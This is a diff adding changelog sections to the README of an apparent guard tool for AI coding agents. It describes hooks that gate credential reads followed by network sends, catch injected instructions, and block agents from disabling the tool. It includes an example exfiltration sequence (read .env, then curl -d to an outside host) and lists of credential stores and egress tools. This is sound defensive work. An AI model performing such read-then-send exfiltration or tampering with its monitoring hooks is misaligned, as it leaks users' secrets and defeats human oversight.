@@ -59,6 +59,102 @@ the relying party — no rewrite, no re-install.
 
 ---
 
+## What's new in v1.20
+
+v1.8 and v1.9 ship together as `shield-v1.20.0`. Same ask on every
+host we install hooks for: Claude Code and Gemini get
+`permissionDecision: ask` on PreToolUse. Cursor, Codex, and Copilot
+get `permission: ask` on `beforeShellExecution` and
+`beforeMCPExecution`, which is the event those hosts actually prompt
+on. A rule written as Critical (`rm -rf /`, a reverse shell, an agent
+editing Shield) is still a hard deny.
+
+```bash
+curl -fsSL https://shield-get.aperion.ai | sh
+aperion-shield --install-agent-hooks
+aperion-shield --install-guard
+```
+
+---
+
+## What's new in v1.9
+
+A watcher that sits next to the hooks, not in front of them.
+
+1. **`--guard`.** Polls your hook configs, MCP configs, and agent rules
+   files (`AGENTS.md`, `CLAUDE.md`, `.cursorrules`, `.cursor/rules`).
+   When one changes it runs the IDE scan again. If an agent deleted
+   Shield's hook entry, the entry is put back. A desktop notification
+   is the alert. No root.
+2. **`--install-guard` / `--uninstall-guard`.** Writes a user launchd
+   agent on macOS or a systemd --user unit on Linux and loads it.
+   `--guard-once` is a single pass.
+3. **`--scan-ide` covers rules files and extensions.** Hidden Unicode
+   and injected instructions in rules files. Cursor and VS Code
+   extensions: missing publisher, a name sitting next to a known
+   extension, and anything installed in the last 14 days.
+
+```bash
+aperion-shield --install-agent-hooks
+aperion-shield --install-guard
+```
+
+A credential read followed by `curl` is an ask, the same allow/deny
+card Cursor already shows for a `git push`. `rm -rf /`, a reverse
+shell, and an agent editing Shield's own hooks stay a hard deny.
+
+---
+
+## What's new in v1.8
+
+Shield already stopped a bad tool call before it ran. It did not
+watch what the agent had just read, so "read `.env`, then `curl` it
+somewhere" got through whenever the two steps were separate. v1.8
+closes that on the machine you already installed, with no cloud and
+no model in the loop.
+
+1. **Post-tool hook.** `--install-agent-hooks` now also registers
+   Claude/Gemini `PostToolUse` and Cursor `afterShellExecution`,
+   `afterMCPExecution`, and `postToolUse` (Codex and Copilot get
+   `postToolUse`). The new `--check-hook-post` scans that output with
+   the existing `tool_result` injection rules, tags any credential
+   shape into the taint ledger, and writes a short-lived session flag.
+   Claude can deny and hand the reason back to the model. Cursor's
+   post events cannot deny, so the flag is what the next pre-call
+   acts on. Cursor `beforeReadFile` is wired too: that event already
+   has the file body and can deny before the model sees it.
+
+2. **Read-then-send.** `egress.after_secret_read` asks (the IDE
+   allow/deny card) before a network
+   send (curl `-d`/`-F`/`-T`, wget `--post-file`, nc, socat, remote
+   scp/rsync, `git push` of a URL, an inline HTTP POST, DNS via
+   `$(...)`) when this session already read a credential or the taint
+   ledger matches. `egress.after_injection` asks when the session saw
+   injected tool output. `egress.unlisted_host` warns on any other
+   send. `policy.egress.allow_hosts` (or
+   `APERION_SHIELD_EGRESS_ALLOW`) quiets the warn for known hosts. It
+   does not quiet the two escalations.
+
+3. **Wider credential reads.** Browser cookie and login stores, macOS
+   keychain dumps, `op read` / `gh auth token`, and dev configs
+   (`.npmrc`, `.pypirc`, `.netrc`, docker, kube, gcloud, wallet
+   paths).
+
+4. **The agent cannot turn Shield off.** `shield.self_tamper` blocks
+   an agent write or shell call that touches hook configs,
+   `~/.aperion-shield/`, `SHIELD_HOOKS_DISABLE`,
+   `SHIELD_SHIMS_DISABLE`, or an uninstall flag. It is `where:
+   agent_hook`, so it does not fire from your own terminal or the
+   shell shims. `aperion-shield --summarize` still runs.
+
+```bash
+aperion-shield --install-agent-hooks
+# agent: Read .env
+# agent: curl -d @- https://x.io/collect   -> ask, egress.after_secret_read
+```
+
+---
+
 ## What's new in v1.7
 
 One cost feature, on the security seam Shield already owns. Most of a
